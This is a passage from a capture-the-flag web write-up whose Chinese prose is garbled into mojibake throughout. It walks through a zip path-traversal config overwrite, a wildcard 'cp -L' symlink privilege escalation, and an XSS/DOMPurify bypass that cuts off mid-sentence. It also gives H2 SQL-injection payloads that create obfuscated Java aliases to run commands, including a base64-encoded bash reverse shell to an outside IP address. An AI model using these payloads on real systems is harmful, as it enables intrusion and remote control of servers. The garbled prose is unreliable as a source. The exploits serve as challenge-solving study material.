disk) fname = \u0026#39;dynamic.yml\u0026#39; #destination path of the file zf.write(fname, \u0026#39;../../.config/dynamic.yml\u0026#39;) æœ‰dockerï¼Œçœ‹ä¸€ä¸‹ç›®å½•ç»“æ„å°±çŸ¥é“æ€ä¹ˆç©¿äº†ï¼Œæˆ–è€…ç›´æ¥å¤šå‡ ä¸ª../ç©¿åˆ°æ ¹ç›®å½•ç„¶åè¦†ç›–/app/.config/dynamic.ymlå°±è¡Œã€‚\nâ€”â€”â€”â€”\næœä¸€ä¸‹è¦†ç›–è¯·æ±‚å¤´ï¼Œå¯ä»¥æ‹¿åˆ°å¦‚ä¸‹æ–‡ç« ï¼š\nhttps://www.azfum.com/archives/wswfale/\né‡Œé¢å°±æåˆ°äº†å¯ä»¥è¦†ç›–è¯·æ±‚å¤´ï¼Œç”¨middlewares:å°±è¡Œï¼Œæ‰€ä»¥ä½¿ç”¨çš„dynamic.ymlï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy flag: rule: Path(`/flag`) entrypoints: [web] service: proxy middlewares: - xff-rewrite middlewares: xff-rewrite: headers: customRequestHeaders: X-Forwarded-For: \u0026#34;127.0.0.1\u0026#34; ç”Ÿæˆzipæ–‡ä»¶åï¼Œä¸Šä¼ ï¼š\nè§£å‹æˆåŠŸï¼š\næœ€åå†è®¿é—®flagè·¯ç”±å³å¯ï¼š\næ‹¿åˆ°flagã€‚\nbackup ç®€å•å¾—RCE â€”â€”â€”â€”â€”â€”â€”â€”\nè¿™é“é¢˜æ²¡æœ‰dockerï¼Œç®€å•åˆ›äº†ä¸€ä¸ªdockerç¯å¢ƒæ¥æµ‹è¯•ï¼Œæ‰“çš„æ—¶å€™æ£‹å·®ä¸€æ‹›å‘€ï¼Œæ²¡æ‰¾å¯¹é€‰é¡¹ã€‚å…·ä½“çœ‹wpå§ã€‚\nä¸€å¼€å§‹çœ‹é¡µé¢æºä»£ç çœ‹åˆ°å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹$_REQUEST[\u0026quot;__2025.happy.new.year\u0026quot;]ï¼Œéæ³•å‚æ•°åé—®é¢˜ï¼Œpostä¼ å‚å°±è¡Œï¼š_[2025.happy.new.yearï¼Œç›´æ¥bashå¼¹ä¸ªshellï¼ŒåŸæ–‡ä»¶çš„å¤–é¢å¥—çš„system()å‡½æ•°ï¼Œæ‰€ä»¥ç›´æ¥ä¼ å‘½ä»¤å°±è¡Œäº†ï¼ˆhackbarä¼ å‚çš„è¯éœ€è¦urlç¼–ç å†ä¼ ï¼‰ï¼š\nè¿™é‡Œçš„/flagæ˜¯400æƒé™ï¼Œéœ€è¦ææƒã€‚\næ ¹ç›®å½•æœ‰ä¸€ä¸ª/backup.sh æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 #!/bin/bash cd /var/www/html/primary while : do cp -P * /var/www/html/backup/ chmod 755 -R /var/www/html/backup/ sleep 15s done shæ–‡ä»¶å†…å®¹å°±ä¸å¤šè¯´äº†ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´å°±ä¼šè¿è¡Œä¸€æ¬¡ï¼Œps -auxå‘½ä»¤çœ‹ä¸€ä¸‹æ˜¯å¦åœ¨è¿è¡Œï¼š\nåœ¨è¿è¡Œï¼Œå¹¶ä¸”æ˜¯rootæƒé™ã€‚åŸºæœ¬ä½ å¯ä»¥ç¡®å®šæ˜¯æ‰“è¿™ä¸ªæ¥ææƒäº†ã€‚\nçœ‹åˆ°è¿™é‡Œçš„*ï¼Œå¾ˆç†Ÿæ‚‰çš„é€šé…ç¬¦ææƒï¼Œå¹¶ä¸”æ¶‰åŠåˆ°äº†cpå‘½ä»¤ï¼Œprimaryç›®å½•å¯å†™æ–‡ä»¶ã€‚å¦‚æœå¯ä»¥åˆ›å»ºåä¸º../../../../flagçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå¾ˆå¿«å°±å‡ºäº†ï¼Œä½†æ˜¯åœ¨shellä¸­ï¼Œåªä¼šå°†/è§†ä½œç›®å½•ï¼Œæ‰€ä»¥æ˜¯æ‰“ä¸äº†çš„ã€‚\nåé¢æ‰¾æ€è·¯ï¼Œæƒ³åˆ°äº†è½¯é“¾æ¥ï¼Œé‚£ä¹ˆå°±æ˜¯æƒ³ç€è½¯é“¾æ¥é“¾æ¥åˆ°/flagç›®å½•ï¼Œç„¶åshè„šæœ¬ä¼šå°†è½¯é“¾æ¥å¸¦çš„å†…å®¹ä¸€èµ·ç»™è®¾ç½®ä¸ºå¯è¯»æƒé™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä½¿ç”¨äº†-Pé€‰é¡¹ï¼Œè¿™ä¸ªåœ¨cpæ—¶ä¸ä¼šå¸¦ç¬¦å·é“¾æ¥ï¼Œæ‰€ä»¥éœ€è¦ç»•ä¸€ä¸‹ã€‚ç½‘ä¸Šæœï¼Œè¯´æ˜¯-aé€‰é¡¹å¯ä»¥ï¼Œæ‰“äº†ä¸€ä¸‹æ²¡æ‰“å‡ºæ¥ï¼Œåé¢å°±æ²¡æ€ä¹ˆæ‰“äº†ã€‚\nèµ›åå†æœäº†ä¸€ä¸‹ï¼Œ-Lé€‰é¡¹æ˜¯å¯ä»¥æ‰“çš„ï¼Œä¹Ÿå°±æ˜¯è¯´-Lé€‰é¡¹ä¼šè®©cpå‘½ä»¤å¤åˆ¶è½¯é“¾æ¥æŒ‡å‘çš„æ–‡ä»¶ï¼Œè€Œ-Pé€‰é¡¹ï¼Œåªä¼šå¤åˆ¶è½¯é“¾æ¥æœ¬èº«ï¼Œæ‰€ä»¥æ‰“ä¸äº†ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://www.cnblogs.com/chentiao/p/17363300.html\næœ€åå°è¯•å¦‚ä¸‹ï¼š\n1 2 3 4 5 cd /var/www/html/primary echo \u0026gt; -L ln -s /flag flag123 cd ../backup cat flag123 å°±å¯ä»¥å¾—åˆ°flagã€‚éœ€è¦æ³¨æ„ï¼Œè¦ç­‰shè„šæœ¬æ‰§è¡Œå®Œäº†å†æ‰“ï¼š\nçœ‹j1rryå¸ˆå‚…çš„æ–‡ç« ï¼Œè¿˜å¯ä»¥æ‰“-Hé€‰é¡¹ï¼Œæ˜¯ç›´æ¥ä»cp --hé€‰é¡¹é‡Œé¢ç¿»å‡ºæ¥çš„ï¼Œå­¦ä¹ ä¸€ä¸‹ï¼Œæ„Ÿè§‰é€šé…ç¬¦ææƒåŸºæœ¬éƒ½æ˜¯è€ƒçš„åˆ©ç”¨é€‰é¡¹æ¥ææƒã€‚\nEasyDB javaé¢˜ï¼Œè·Ÿç€å¤ç°ä¸€ä¸‹ã€‚\njadxåç¼–è¯‘ä¸€ä¸‹ï¼Œæ‹¿åˆ°æœ¬åœ°æ¥çœ‹ä¸€æºç ã€‚å®¡è®¡è·¯ç”±ï¼Œå‘ç°å­˜åœ¨ç™»å½•è·¯ç”±ï¼š\nè·Ÿè¿›çš„ä»£ç æŸ¥çœ‹ï¼Œå‘ç°å­˜åœ¨sqlæ³¨å…¥ï¼š\nè¿™é‡Œæ˜¯ç›´æ¥æ‹¼æ¥è¿›çš„usernameå’Œpasswordï¼Œæ‰€ä»¥æ˜¯å­˜åœ¨sqlæ³¨å…¥çš„ã€‚\nçœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆæ•°æ®åº“ï¼š\nh2æ•°æ®åº“ï¼Œé“è¡Œè¿˜æµ…ï¼Œä»¥ä¸ºæ˜¯æ‰“JDBCï¼Œæœåˆ°ä¸€ä¸ªæ‰“H2æ•°æ®åº“çš„æ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/13371\né‡Œé¢æåˆ°äº†ä¸€ä¸ªå¦‚æœå¯ä»¥æ‰§è¡Œä»»æ„H2 SQLçš„è¯­å¥ï¼Œå¯ä»¥é€šè¿‡Alias Script æ¥è¿›è¡ŒRCEï¼Œæ‰“çš„å †å æ³¨å…¥ã€‚å‚è€ƒå¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 //åˆ›å»ºåˆ«åï¼Œå…¶å®å°±æ˜¯åˆ›å»ºä¸€ä¸ªæ‰§è¡Œå‡½æ•°ï¼š CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$; //è°ƒç”¨SHELLEXECæ‰§è¡Œå‘½ä»¤ CALL SHELLEXEC(\u0026#39;id\u0026#39;); CALL SHELLEXEC(\u0026#39;whoami\u0026#39;); çœ‹ä»£ç ï¼Œå¯ä»¥çŸ¥é“è¿™ä¸ªæ˜¯ç›´æ¥ä¼šå°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœå›æ˜¾åˆ°é¡µé¢ä¸Šçš„ï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯çœ‹æ€ä¹ˆè¿›è¡Œæ³¨å…¥ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æäº¤sqlè¯­å¥æŸ¥è¯¢æ—¶ï¼Œä¼šå…ˆcheck()ä¸€ä¸‹ï¼š\nä¹Ÿå°±æ˜¯è¯´æœ‰é»‘åå•ï¼Œé»‘åå•å¦‚ä¸Šã€‚çœ‹äº†ä¸€ä¸‹ï¼Œæ˜¯åŠ äº†å°å†™çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸»è¦éœ€è¦ç»•çš„æ˜¯runtimeå’Œexecï¼Œçœ‹è¿™ä¸ªåˆ›å»ºåˆ«åçš„è¯­å¥ï¼Œå…¶å®å°±æ˜¯åœ¨é‡Œé¢è‡ªå®šä¹‰äº†ä¸€æ®µjavaå‘½ä»¤æ‰§è¡Œçš„ä»£ç ï¼Œå’Œæ­£å¸¸çš„Javaè¯­å¥æ²¡æœ‰ä»€ä¹ˆå´æ¯”ï¼Œç»•çš„è¯è¿˜æ˜¯å¾ˆå¥½ç»•çš„ï¼Œå¯ä»¥ä½¿ç”¨unicodeç¼–ç å…³é”®å­—+åå°„æ¥è¿›è¡Œå°è¯•ï¼š\n1 2 3 4 5 6 7 8 9 //åˆ›å»ºåˆ«åï¼Œå…¶å®å°±æ˜¯åˆ›å»ºä¸€ä¸ªæ‰§è¡Œå‡½æ•°ï¼š CREATE ALIAS CMD AS $$ String cmd(String cmd) throws java.io.IOException { Class clazz= Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;); java.lang.reflect.Method mGet = clazz.getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;); Object gettime = mGet.invoke(null); java.lang.reflect.Method exee = gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class); exee.invoke(gettime,cmd);}$$; CALL CMD(\u0026#39;whoami\u0026#39;); ç„¶åç®€å•ç²¾ç®€ä¸€ä¸‹ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 //åˆ›å»ºåˆ«åï¼Œå…¶å®å°±æ˜¯åˆ›å»ºä¸€ä¸ªæ‰§è¡Œå‡½æ•°ï¼š CREATE ALIAS CMD AS $$ String cmd(String cmd) throws java.io.IOException { Object gettime = Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;).getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;).invoke(null); gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class).invoke(gettime,cmd);}$$; CALL CMD(\u0026#39;whoami\u0026#39;); å°è¯•å¦‚ä¸‹æ„é€ ï¼Œç„¶åæ‹¼æ¥å¦‚ä¸‹ï¼š\n1 2 3 SELECT * FROM users WHERE username = \u0026#39;admin\u0026#39;; CREATE ALIAS CMD AS $$ String cmd(String cmd) throws java.io.IOException { Object gettime = Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;).getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;).invoke(null); gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class).invoke(gettime,cmd);}$$; CALL CMD(\u0026#39;whoami\u0026#39;); --\u0026#39; AND password = \u0026#39;%s\u0026#39; è¿™é‡Œæ˜¯æˆ‘æ˜¯æ”¹æˆäº†æ²¡æœ‰å›æ˜¾çš„ï¼Œç›´æ¥åœ¨å¼¹ä¸ªshellå³å¯ï¼š\n1 2 admin\u0026#39;; CREATE ALIAS CMD AS $$ String cmd(String cmd) throws Exception { Class clazz= Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;);java.lang.reflect.Method mGet = clazz.getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;);Object gettime = mGet.invoke(null);java.lang.reflect.Method exee = gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class);exee.invoke(gettime,cmd);return \u0026#34;123\u0026#34;; }$$; CALL CMD(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;); -- æ²¡å¼¹ä¸Šï¼Œç›´æ¥è¢«è§£ææˆäº†execå…³é”®å­—ï¼Ÿå¯èƒ½å°±æ˜¯è¿™ä¸ªåŸå› ï¼Œè¢«wafäº†ã€‚çœ‹äº†ä¸€ä¸‹å…¶ä»–è§£æ³•ï¼Œè¿™é‡Œè¿˜å¯ä»¥ä½¿ç”¨æ‹¼æ¥ï¼Œæ¯”å¦‚ï¼š\n1 2 admin\u0026#39;; CREATE ALIAS CMD AS $$ void cmd(String cmd) throws Exception { String name = \u0026#34;Run\u0026#34;+\u0026#34;time\u0026#34;;Class clazz= Class.forName(\u0026#34;java.lang.\u0026#34;+name);java.lang.reflect.Method mGet = clazz.getDeClaredMethod(\u0026#34;get\u0026#34;+name);Object gettime = (Object)mGet.invoke(null);gettime.getClass().getDeclaredMethod(\u0026#34;ex\u0026#34;+\u0026#34;ec\u0026#34;,String.class).invoke(gettime,cmd);}$$; CALL CMD(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;); -- ä½†æ˜¯æ„é€ çš„è¯­å¥æ€»æ˜¯æœ‰é—®é¢˜ï¼Œç›´æ¥ç”¨åˆ«äººçš„äº†ï¼Œå¤§æ¦‚å¦‚ä¸‹ï¼š\n1 admin\u0026#39;; CREATE ALIAS evil AS $$void jerry(String cmd) throws Exception{ String R=\u0026#34;R\u0026#34;+\u0026#34;untime\u0026#34;;Class\u0026lt;?\u0026gt; c = Class.forName(\u0026#34;java.lang.\u0026#34;+R);Object rt=c.getMethod(\u0026#34;get\u0026#34;+R).invoke(null);c.getMethod(\u0026#34;exe\u0026#34;+\u0026#34;c\u0026#34;,String.class).invoke(rt,cmd);}$$;CALL evil(\u0026#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#39;);-- ç¡®å®æˆåŠŸå¼¹èµ·äº†ï¼Œå¯¹æ¯”äº†ä¸€ä¸‹ï¼Œé—®é¢˜å¯èƒ½å­˜åœ¨äºç±»å‹è½¬æ¢çš„é—®é¢˜ã€‚ä¿®ä¿®æ”¹æ”¹è‡ªå·±çš„pocï¼Œè¿˜æ˜¯æ‰“ä¸å‡ºæ¥ï¼Œä¸å¤šçº ç»“äº†ã€‚è¿˜å¯ä»¥base64ç¼–ç è¿™æ ·æ‰“ï¼š\n1 \u0026#39;;CREATE ALIAS hello AS $$ String hello() throws Exception { Class c = Class.forName(new String(java.util.Base64.getDecoder().decode(\u0026#34;amF2YS5sYW5nLlJ1bnRpbWU=\u0026#34;)));java.lang.reflect.Method m1 = c.getMethod(new String(java.util.Base64.getDecoder().decode(\u0026#34;Z2V0UnVudGltZQ==\u0026#34;)));Object o = m1.invoke(null);java.lang.reflect.Method m2 = c.getMethod(new String(java.util.Base64.getDecoder().decode(\u0026#34;ZXhlYw==\u0026#34;)), String[].class);m2.invoke(o, new Object[]{new String[]{\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, new String(java.util.Base64.getDecoder().decode(\u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=\u0026#34;))}});return null; }$$; CALL hello();-- æœ€åæ‰“å°±è¡Œäº†ï¼š\næ³¨æ„urlç¼–ç ï¼Œä»¥åŠè¿™ä¸ªåˆ«ååº”è¯¥åªèƒ½åˆ›ä¸€æ¬¡ï¼Œå¦åˆ™éœ€è¦é‡æ–°å¼€ç¯å¢ƒã€‚æœ€åæ‹¿åˆ°flagï¼š\nâ€”â€”â€”â€”â€”â€”\nå‚è€ƒï¼š\nhttps://j1rry-learn.github.io/posts/2025-n1ctf-junior-web-%E6%96%B9%E5%90%91%E5%85%A8%E8%A7%A3/#gavatar\ndisplay hintï¼šç”¨iframeåµŒå…¥å­é¡µé¢å¯ä»¥é‡æ–°å”¤èµ·DOMè§£æå™¨è§£æscriptæ ‡ç­¾\nâ€”â€”â€”â€”â€”â€”\nåŒæ ·æ˜¯ç»™äº†dockeræºç çš„ï¼Œnode.jsã€‚å®¡è®¡æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°åŒæ ·æ˜¯ä¸€ä¸ªXSSæ“ä½œï¼Œç„¶åæœ‰cspé™åˆ¶ï¼š\n1 2 3 4 5 6 const csp = \u0026#34;script-src \u0026#39;self\u0026#39;; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;none\u0026#39;;\u0026#34;; app.use((req, res, next) =\u0026gt; { res.setHeader(\u0026#39;Content-Security-Policy\u0026#39;, csp); next(); }); app.jsæ–‡ä»¶å†…å®¹ï¼Œå¯ä»¥çŸ¥é“ä¼šå°†æ‰€æœ‰çš„è·¯ç”±éƒ½è®¾ç½®ä¸Šäº†è¿™ä¸ªé™åˆ¶ã€‚\nçœ‹app.jsæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å¯¹404é¡µé¢è¿›è¡Œäº†å¤„ç†çš„ï¼š\n1 2 3 app.use((req, res) =\u0026gt; { res.status(200).type(\u0026#39;text/plain\u0026#39;).send(`${decodeURI(req.path)} : invalid path`); }); // 404 é¡µé¢ è¿™é‡Œå’ŒSekaiCTF 2024 Taglessé¢˜å¾ˆåƒã€‚é‚£ä¹ˆç°åœ¨æ¥çœ‹ä¸€ä¸‹å›æ˜¾ï¼š\nä½†æ˜¯å¹¶ä¸èƒ½è§£æä¸ºjsä»£ç ï¼š\næ§åˆ¶å°ä¹Ÿæ²¡æœ‰çœ‹åˆ°CSPé™åˆ¶çš„æŠ¥é”™ã€‚\nå†ç»§ç»­çœ‹ä»£ç ï¼Œè¿˜å¯ä»¥çœ‹åˆ°æœ‰å‘botå‘èµ·è¯·æ±‚çš„åœ°æ–¹ï¼š\nè·Ÿè¿›visit()å°±åˆ°äº†botçš„å®šä¹‰ä»£ç ï¼Œä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const HOST = \u0026#39;localhost:3000\u0026#39;; const FLAG = process.env.FLAG ?? \u0026#39;flag{test}\u0026#39;; function sleep(ms) { return new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); } const visit = async (text) =\u0026gt; { const browser = await puppeteer.launch({ headless: true, args: [\u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-setuid-sandbox\u0026#39;] }); await browser.setCookie({ name: \u0026#39;flag\u0026#39;, value: FLAG, domain: HOST, path: \u0026#39;/\u0026#39;, httpOnly: false }); const page = await browser.newPage(); await page.goto(`http://${HOST}/?text=${encodeURI(text)}`); await sleep(5000); await page.close(); } module.exports = {visit}; å¯ä»¥çœ‹åˆ°ä¼šåœ¨botä¸­å¸¦ä¸Šflagã€‚ç„¶åè®¾ç½®äº†httponlyä¸ºfalseï¼Œå¯ä»¥é€šè¿‡XSSæ¥è·å–ã€‚å¹¶ä¸”è¿™é‡Œbotçš„è®¿é—®é€»è¾‘æ˜¯åªè®¿é—®/è·¯ç”±å¹¶å¸¦ä¸Šæˆ‘ä¼ å‚çš„textï¼Œè¿™é‡Œå°±æ˜¯éœ€è¦åˆ©ç”¨çš„ç‚¹ã€‚\nç°åœ¨æ¥çœ‹å‰ç«¯å¼•ç”¨çš„jsï¼Œæ˜¯ä¸€ä¸ªDOMå‹XSSï¼š\nè·å–textå‚æ•°ï¼Œç„¶åå°†å…¶base64è§£ç åå†æ£€éªŒä¸€ä¸‹ï¼Œcheckçš„å‡½æ•°å†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 function sanitizeContent(text) { // Only allow \u0026lt;h1\u0026gt;, \u0026lt;h2\u0026gt;, tags and plain text const config = { ALLOWED_TAGS: [\u0026#39;h1\u0026#39;, \u0026#39;h2\u0026#39;] }; return DOMPurify.sanitize(text, config); } è¿™é‡Œåˆ©ç”¨åˆ°äº†DOMPurifyæ¥æ£€éªŒï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºæ¸…ç†HTMLã€MathMLå’ŒSVGçš„JavaScriptçš„åº“ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ç”¨æ¥é˜²èŒƒXSSæ”»å‡»ã€‚æœç´¢è¿™ä¸ªåº“çš„æ¼æ´ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹æ–‡ç« ï¼š\nã€Šåˆ©ç”¨çªå˜XSSç»•è¿‡DOMPurify 2.0.0 ã€‹\nä½†æ˜¯æˆ‘ä»¬è¿™é‡Œç‰ˆæœ¬ä¸ºDOMPurify 3.2.3ï¼Œç°åœ¨å¹¶æ²¡æœ‰ç°æˆçš„POCæ¥æ‰“ã€‚\nåœ¨index.jsæ–‡ä»¶ä¸­ï¼Œæœ‰ä¸€ä¸ªç‚¹å€¼å¾—æ³¨æ„ä¸€ä¸‹ï¼š\n1 2 textInput.innerHTML = sanitizedText; // å†™å…¥é¢„è§ˆåŒº contentDisplay.innerHTML = textInput.innerText; // å†™å…¥æ•ˆæœæ˜¾ç¤ºåŒº è¿™é‡Œæåˆ°äº†innerHTMLå’ŒinnerTextï¼Œç”¨ä¸€ä¸ªä»£ç æ¥è¯´æ˜è¿™ä¸¤ä¸ªä¹‹é—´çš„åŒºåˆ«ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;div id=\u0026#34;example\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Hello \u0026lt;strong\u0026gt;World\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var content = document.getElementById(\u0026#34;example\u0026#34;); console.log(content.innerHTML); console.log(content.innerText); \u0026lt;/script\u0026gt; è¾“å‡ºä¸ºï¼š\n1 2 3 \u0026lt;p\u0026gt;Hello \u0026lt;strong\u0026gt;World\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; Hello World ç„¶åç¨å¾®æ”¹ä¸€ç‚¹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;div id=\u0026#34;example\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Hello \u0026amp;lt;strong\u0026amp;gt;World\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var content = document.getElementById(\u0026#34;example\u0026#34;); console.log(content.innerHTML); console.log(content.innerText); \u0026lt;/script\u0026gt; è¾“å‡ºä¸ºï¼š\n1 2 3 \u0026lt;p\u0026gt;Hello \u0026amp;lt;strong\u0026amp;gt;World\u0026lt;/p\u0026gt; Hello \u0026lt;strong\u0026gt;World ä»ä¸¤ä¸ªç»“æœçš„å¯¹æ¯”ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œçš„innerHTMLç”¨äºè·å–æˆ–è®¾ç½®å…ƒç´ çš„ HTML å†…å®¹ï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„ HTML æ ‡ç­¾ï¼Œè€ŒinnerTextåˆ™æ˜¯ä¼šè§£æHTMLæ ‡ç­¾ä¸ºæ–‡æœ¬ï¼Œå¦‚æœæœ‰HTMLç¼–ç å†…å®¹ï¼Œé‚£ä¹ˆå°±ä¼šå°†å…¶è§£ç ä¸€æ¬¡ã€‚å¯ä»¥æµ…æ˜¾ç†è§£ä¸ºinnerHTMLå°±æ˜¯è·å–å…¨éƒ¨HTMLæ ‡ç­¾çš„å†…å®¹ï¼Œè€ŒinnerTextåˆ™æ˜¯HTMLæ¸²æŸ“ä¸€æ¬¡ï¼Œç±»ä¼¼äºå‰ç«¯æ¸²æŸ“çš„æ•ˆæœã€‚\né‚£ä¹ˆè¿™æ ·çœ‹æ¥ï¼Œæºä»£ç æ˜¯å­˜åœ¨æ¼æ´çš„ï¼Œå†ç²˜è¿‡æ¥ä¸€ä¸‹ï¼š\n1 2 textInput.innerHTML = sanitizedText; // å†™å…¥é¢„è§ˆåŒº contentDisplay.innerHTML = textInput.innerText; // å†™å…¥æ•ˆæœæ˜¾ç¤ºåŒº åœ¨è¿™é‡Œï¼Œå¯ä»¥å°è¯•å°†sanitizedTextçš„å†…å®¹HTMLç¼–ç ä¸€ä¸‹ï¼Œç„¶åtextInput.innerTextä¼šå°†å…¶æ¸²æŸ“ï¼Œä¹Ÿå°±æ˜¯HTMLè§£ç ä¸€æ¬¡ã€‚å¹¶å°†å…¶èµ‹å€¼ç»™äº†å†…å®¹æ˜¾ç¤ºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨å‰ç«¯æ˜¾ç¤ºä¸€ä¸ªHTMLæ ‡ç­¾å‡ºæ¥ï¼Œå°è¯•å¦‚ä¸‹ï¼š\nç¼–ç ï¼š\nç„¶åbase64ç¼–ç ä¸€æ¬¡ä¼ è¿›å»ã€‚\næˆåŠŸæ¸²æŸ“ï¼š\nè¿™é‡Œåœ¨é¢„è§ˆæ—¶å°±åœ¨å‰ç«¯æ¸²æŸ“æˆäº†ä¸€ä¸ªæ ‡ç­¾ã€‚ä½†æ˜¯ä¸ä¼šè§£æã€‚\nç»è¿‡å‰é¢çš„æ„é€ ï¼Œé‚£ä¹ˆcontentDisplayå‰ç«¯æ¸²æŸ“æ—¶å°±ä¼šè¢«æ¸²æŸ“ä¸ºjsæ ‡ç­¾ï¼š\nä½†æ˜¯å¹¶æ²¡æœ‰è§£æï¼Œè¿™æ˜¯å› ä¸ºå†…å®¹æ˜¯åŠ¨æ€æ”¾ç½®åœ¨ \u0026lt;div\u0026gt; å†…çš„ï¼Œå¹¶ä¸”ç”±äºä½¿ç”¨äº†innerHTMLï¼Œå› æ­¤è„šæœ¬æ²¡æœ‰æ‰§è¡Œã€‚è¿™é‡Œä¸»è¦çš„åˆ©ç”¨ç‚¹åœ¨contentDisplayï¼Œé€šè¿‡å°†contentDisplay.innerHTMLè®¾ç½®ä¸ºä¸€ä¸ªæ­£å¸¸çš„htmlæ ‡ç­¾ï¼Œç„¶åæ’å…¥åˆ°DOMæ ‘ä¸­ã€‚ï¼ˆè¿™æ®µä»£ç è®¾è®¡å¾—ç§’å‘€ï¼‰\néƒ½æ˜¯æ²¡æœ‰è§£æã€‚é‚£ä¹ˆçœ‹æ­¤æ—¶çš„Hintï¼šç”¨iframeåµŒå…¥å­é¡µé¢å¯ä»¥é‡æ–°å”¤èµ·DOMè§£æå™¨è§£æscriptæ ‡ç­¾ã€‚\né‚£ä¹ˆæ˜¯é™åˆ¶äº†\u0026lt;script\u0026gt;æ ‡ç­¾çš„è§£æï¼Ÿ\nå°è¯•ä¸€ä¸‹åœ¨404é¡µé¢ä½¿ç”¨\u0026lt;iframe\u0026gt;æ ‡ç­¾åµŒå…¥å‰é¢çš„/è·¯ç”±ï¼š\nä¼¼ä¹æ˜¯å› ä¸º?è¿™ä¸ªgetä¼ å‚ç¬¦å·åé¢å…¨éƒ½è¢«èˆå¼ƒäº†ï¼Ÿé‚£ä¹ˆåµŒå¥—ä¸€ä¸‹404é¡µé¢ï¼š\nè¿˜æ˜¯ä¸è¡Œï¼ŒåŒæ—¶ï¼Œ\u0026lt;iframe\u0026gt;æ ‡ç­¾çš„srcå±æ€§è¿˜å¯ä»¥ç›´æ¥åµŒå¥—javascriptåè®®æ¥ç›´æ¥æ‰§è¡Œä»£ç ï¼Œå¦‚ï¼š\n1 \u0026lt;iframe src=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; åŒæ ·çš„è¿˜æœ‰\u0026lt;iframe\u0026gt;è¿˜æœ‰ä¸€ä¸ªsrcdocå±æ€§ï¼Œè¿™ä¸ªå±æ€§å¯ä»¥ç›´æ¥å¼•å…¥\u0026lt;script\u0026gt;æ ‡ç­¾ï¼Œå¦‚ï¼š\n1 \u0026lt;iframe 